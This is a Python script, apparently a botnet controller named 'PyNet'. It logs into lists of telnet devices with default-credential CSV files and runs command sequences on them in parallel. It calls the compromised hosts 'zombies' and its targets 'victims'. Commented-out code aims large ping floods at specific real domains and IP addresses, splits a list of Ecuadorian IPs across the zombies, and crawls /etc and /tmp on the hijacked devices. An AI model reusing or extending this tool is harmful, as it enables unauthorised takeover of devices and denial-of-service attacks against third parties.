#!/usr/bin/env python3

# This script perform telnet connections using socket instead of telnetlib.
# The intention is to execute command sequences quickly, even perform fuzzing techniques.
# Save logs and analyze output for creation of more command sequences.

import os
import re
import sys
import time
import random
import signal
import argparse
import threading

# Personal packages
from utils.colors import Colors
from backend.backend import conn_simple
from sockets.sconnection import telnet_auth_sequence, socket_send_data, socket_send_sequence, socket_send_command
from parsing.wap_commands import pseudo_tree
from commands.telnet_combinations import *
#from commands.fuzzing_combinations import fuzz_netstat, fuzz_ansi, fuzz_terminal_type, fuzz_ftp, fuzz_tree, fuzz_arping, fuzz_special_chars, scan_ping, scan_ping2, attack_ping
from commands.fuzzing_combinations import *
from commands.ping_combinations import ping_attack

# Global variable to track remote sockets
remote_sockets = []

# Setup logs feature
log_number = "10"
credentials_path = "credentials/default.csv"
credentials_path = "credentials/new.csv"
credentials_path = "credentials/various.csv"

def exit_gracefully():
    print("\n\n[!] Exiting gracefully...")

    for remote_socket in remote_sockets:
        try:
            remote_socket.close()
        except:
            continue
    sys.exit(0)

# Signal handler function to catch Ctrl+C
def signal_handler(sig, frame):
    exit_gracefully()

# Register the signal handler for SIGINT (Ctrl+C)
signal.signal(signal.SIGINT, signal_handler)


# Function to parse command-line arguments
def parse_arguments():
    parser = argparse.ArgumentParser(description="PyNet - A Python-based tool for telnet and network operations.")
    parser.add_argument("-q", "--query", help="\t\tGive SQL query for selecting the devices to login.")
    parser.add_argument("-iL", "--ip_list", help="\t\tPath to a file containing a list of IP addresses or hostnames, one per line.")
    parser.add_argument("-iC", "--commands_list", help="\t\tPath to a file containing a list of telnet commands to execute, one per line.")
    parser.add_argument("-i", "--ip", help="\t\tTarget IP address or hostname to authenticate with.")
    parser.add_argument("-p", "--port", default=23, type=int, help="\t\tTarget port (default is 23 for Telnet).")
    parser.add_argument("-g", "--log", default=10, type=int, help="\t\tLog number to save the logs.")
    parser.add_argument("-l", "--login", action="store_true", help="\tSimply login on the target system.")
    parser.add_argument("-c", "--credentials", help="\tPass csv with username and password format for authentication")
    parser.add_argument("-v", "--victim", help="\tTarget victim for sending attacks (IP collection or domain name).")
    parser.add_argument("-d", "--delay", help="\tDelay in seconds between listed hosts for performing connections.")
    return parser.parse_args()


def find_mac_addresses(file_path):
    # Read text from the file
    with open(file_path, 'r') as file:
        text = file.read()
    
    # Regular expression for MAC addresses (colon or hyphen-separated)
    mac_regex = r'([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})'
    mac_addresses = re.findall(mac_regex, text)
    
    # Join tuples into full MAC address strings
    return ["".join(mac) for mac in mac_addresses]


# Main method
def main():

    global target, log_number, credentials_path

    # Parse command-line arguments
    args = parse_arguments()

    if args.victim:
        target = args.victim.encode('ascii')

    if args.log:
        log_number = int(args.log)

    if args.credentials:
        credentials_path = args.credentials

    # Option -i is provided
    if args.ip and args.port:

        # Perform a single telnet connection
        if args.login:

            # Receive list of commands through the args
            if args.commands_list:
                commands_seq = encode_commands(args.commands_list)  # This method comes from telnet_combinations.py
                        

            # Retrieve fuzz list
            #commands_seq = fuzz_netstat(1000000)
            #commands_seq = fuzz_ansi()
            #commands_seq = fuzz_terminal_type()
            #commands_seq = fuzz_ftp()
            #commands_seq = fuzz_tree()
            #commands_seq = fuzz_arping()
            #commands_seq = fuzz_special_chars()
            #commands_seq = fuzz_proxy()
            

            # Select based on if responses will be logged or not
            # handle_target(args.ip, args.port, commands_seq, 4, True, credentials_path) # Log executed commands with True flag
            handle_target(args.ip, args.port, commands_seq, 4, False, credentials_path) # Don't log executed commands with True flag


    # Option -iL is provided
    elif args.ip_list and args.port and args.login:
        # Read the IP list file and iterate through the IP addresses
        ip_list_path = args.ip_list
        with open(ip_list_path, 'r') as file:
            ip_addresses = file.read().splitlines()

            # Shuffle the list randomly
            random.shuffle(ip_addresses)

        # Close the read file properly
        file.close()

        # Construct the ping commands
        ecuador_ips = ""
        if args.victim and os.path.exists(args.victim) is True:
            #ecuador_ips = "/mnt/Kali/home/grimaldi/Bash/Telnet/pynet/split/ecuador_ips.txt"
            ecuador_ips = os.path.join(args.victim)

            total_targets = 0
            with open(ecuador_ips, 'r') as file:
                for line in file:
                    total_targets += 1

            total_zombies = len(ip_addresses)
            targets_per_zombie = int(total_targets/total_zombies)
            print(f"[!] Total Zombies:\n\t[{total_zombies}]")
            print(f"[!] Total Targets:\n\t[{total_targets}]")
            print(f"[!] Total Targets per Zombie:\n\t[{targets_per_zombie}]")

            # Obtain the list of lists
            commands_list = scan_ping2(total_zombies, ecuador_ips, total_targets)

        ip_cont = 1
        for ip in ip_addresses:

            # Simply perform a telnet connection.
            if args.login:

                # Receive list of commands through the args
                if args.commands_list:
                    commands_seq = encode_commands(args.commands_list)  # This method comes from telnet_combinations.py


                print(Colors.BOLD_WHITE + f"[{ip_cont}] Processing IP:\t[{ip}]" + Colors.R)
                ip_cont += 1

                # Fetch the respective list with ping commands
                #commands = commands_list.pop()
                #commands = attack_ping("dnschecker.org", 100)
                #commands_attack = ping_attack("caliente.mx", 1000)
                #commands_attack = ping_attack("45.8.148.88", 1000)
                #commands_attack = ping_attack("118.107.44.111", 1000)


                # Spin up our client thread to handle incoming data
                #target_handler = threading.Thread(target=handle_target, args=(ip, args.port, commands_seq, 0.1, False, credentials_path))
                target_handler = threading.Thread(target=handle_target, args=(ip, args.port, commands_seq, 0.1, True, credentials_path))
                try:
                    target_handler.start()
                    #target_handler.join()
                except:
                    continue

                # Delay time between threads
                if args.delay:
                    delay_between_ips = int(args.delay)
                    time.sleep(delay_between_ips)
                else:
                    time.sleep(0.5)

            #ip_cont += 1

    # -q option is provided for executing the query and select victims from database
    elif args.query:

        # Fetch victims from database
        conn = conn_simple()
        if conn:
            cursor = conn.cursor()
            try:
                # Execute the query passed in args.query
                cursor.execute(args.query)

                # Fetch all rows of the result
                results = cursor.fetchall()

                # Print results (or process them as needed)
                for row in results:
                    ip = row[0]
                    
                    # Receive list of commands through the args
                    if args.commands_list:
                        commands_seq = encode_commands(args.commands_list)  # This method comes from telnet_combinations.py

                    # Spin up our client thread to handle incoming data
                    target_handler = threading.Thread(target=handle_target, args=(ip, args.port, commands_seq, 0.1, True, credentials_path))
                    try:
                        target_handler.start()
                        #time.sleep(0.1)

                        # This slow down the login process but is more reliable
                        target_handler.join()

                    except Exception as e:
                        print(f"[!] Error processing target {ip}: {e}")
                        continue

            except Exception as e:
                print(f"[!] Error executing query: {e}")
            finally:
                # Close the cursor and connection
                cursor.close()
                conn.close()
        else:
            print("[!] Connection failed. Cannot execute query.")

        #for ip in ip_addresses:
        #    change_telnet_password(ip)


    # Error case
    else:
        print("Error: Please provide either -iL or -i option or -q to specify the target IP(s).")


# Handle each victim
def handle_target(ip, port, command_sequence, timeout=2, detail=True, credentials_path="/mnt/Kali/home/grimaldi/Bash/Telnet/pynet/credentials/default.csv"):

    global log_number
    if detail:
        log_dir =  os.getcwd() + f"/logs/logs{log_number}/" 
        log_output = log_dir + ip + f"_log{log_number}"
        log_paths = log_dir + ip + "_paths"

        ## Create the log_dir if not exist
        if not os.path.exists(log_dir):
            os.makedirs(log_dir, exist_ok=True)

        # Create and append socket session
        remote_socket = telnet_auth_sequence(log_number, ip, port, credentials_path, log_output)      # log the auth sequence
        remote_sockets.append(remote_socket)

        # Send sequence of commands
        response = socket_send_sequence(log_number, ip, remote_socket, command_sequence, timeout, detail, log_output)
    else:
        remote_socket = telnet_auth_sequence(log_number, ip, port, credentials_path)                 # don't log the auth sequence
        remote_sockets.append(remote_socket)

        # Send sequence of commands
        response = socket_send_sequence(log_number, ip, remote_socket, command_sequence, timeout, detail)


    #ping_command = b'ping -i 1 -s 65507 -t 64 ' + target + b'\r\n'
    #response = socket_send_command(remote_socket, ping_command, False)

    #response = ls(remote_socket, "/")
    #print(response)

    #pseudo_tree(remote_socket, "/var", 3, log_output, log_paths)
    #pseudo_tree(remote_socket, "/tmp", 3, log_output, log_paths)
    #pseudo_tree(remote_socket, "/etc", 3, log_output, log_paths)

    #commands_ssh = enable_ssh(ip, log_output)
    #response = socket_send_sequence(ip, remote_socket, commands_ssh, timeout, detail, log_output, 10)

    # Close the socket after command execution
    if remote_socket:
        try:
            remote_socket.close()
            # Remove the socket from the dictionary
            if remote_socket in remote_sockets:
                del remote_sockets[remote_socket]
        except:
            pass


# Main method
if __name__ == "__main__":
    main()

    exit_gracefully()
